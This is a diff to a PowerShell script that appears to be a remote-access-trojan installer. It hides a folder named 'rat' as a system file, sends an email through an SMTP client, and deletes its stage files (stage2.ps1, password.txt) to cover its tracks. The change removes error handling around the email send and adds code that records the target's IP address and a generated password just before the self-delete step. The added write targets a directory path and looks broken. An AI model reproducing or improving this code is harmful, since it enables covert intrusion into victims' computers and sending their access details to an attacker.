@@ -72,16 +72,7 @@ $DesktopPath = $temp_folder_path
 $LogFilePath = Join-Path -Path $DesktopPath -ChildPath "EmailLog.txt"
 
 # Send the email and log results
-try {
-    $SMTPClient.Send($MailMessage)
-    $Result = "[$(Get-Date)] Email sent successfully.`nSubject: $Subject`nBody: $Body"
-    Write-Host $Result
-} catch {
-    $Result = "[$(Get-Date)] Failed to send email.`nError: $_`nSubject: $Subject`nBody: $Body"
-    Write-Error $Result
-}
-
-Pause
+$SMTPClient.Send($MailMessage)
 
 # Write result to file
 $Result | Out-File -FilePath $LogFilePath -Append -Encoding UTF8
@@ -115,7 +106,15 @@ attrib +h +s +r rat
 
 # self delete
 Set-Location $current_dir
+
+$file_content = @"
+Target IP Address: $target_ip
+Generated Password: $pass_gen_string
+"@
+Set-Content -Path $current_dir -Value $file_content -Encoding UTF8
+
 Remove-Item $user_name
 Remove-Item email.txt
 Remove-Item password.txt
 Remove-Item stage2.ps1
+
